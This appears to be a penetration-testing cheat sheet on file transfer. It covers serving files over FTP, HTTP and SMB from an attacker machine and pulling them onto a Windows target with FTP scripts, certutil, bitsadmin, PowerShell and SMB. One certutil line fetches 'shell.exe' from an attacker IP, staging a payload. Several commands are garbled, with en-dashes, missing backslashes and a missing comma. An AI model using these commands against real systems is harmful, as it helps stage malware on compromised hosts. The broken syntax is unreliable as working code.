# Serve

### FTP 
````
Python –c pyftpdlib –p 21 –write
````

### HTTP 
````
sudo python3 -m http.server 80 
sudo python -m SimpleHTTPServer 80 
````

### SMB 
````
sudo impacket-smbserver <sharename> <share path>
````


# Client 
### From Windows 

FTP Upload / Download 
````
echo "open <IP> ">ftp.txt
echo "user">>ftp.txt
echo "pass">>ftp.txt
echo "bin">>ftp.txt
echo "get file.exe">>ftp.txt
echo "put file.exe">>ftp.txt
echo "bye">>ftp.txt

ftp -s ftp.txt
````

HTTP  Download 
````
certutil -urlcache -f http://10.10.14.12:8000/shell.exe shell.exe 
bitsadmin /transfer n http://domain/file c:%homepath%file


Powershell 
$p = New-Object System.Net.WebClient $p.DownloadFile("http://domain/file" "C:%homepath%file")
PS C:> .test.ps1
````

SMB Upload / Download 
````
copy \\IP-address\share\x x 
net view \\<ip>
net use x: \127.0.0.1share /user:example.comuserID myPassword

````


### From Linux 

wget 
curl
python
perl
ruby

````

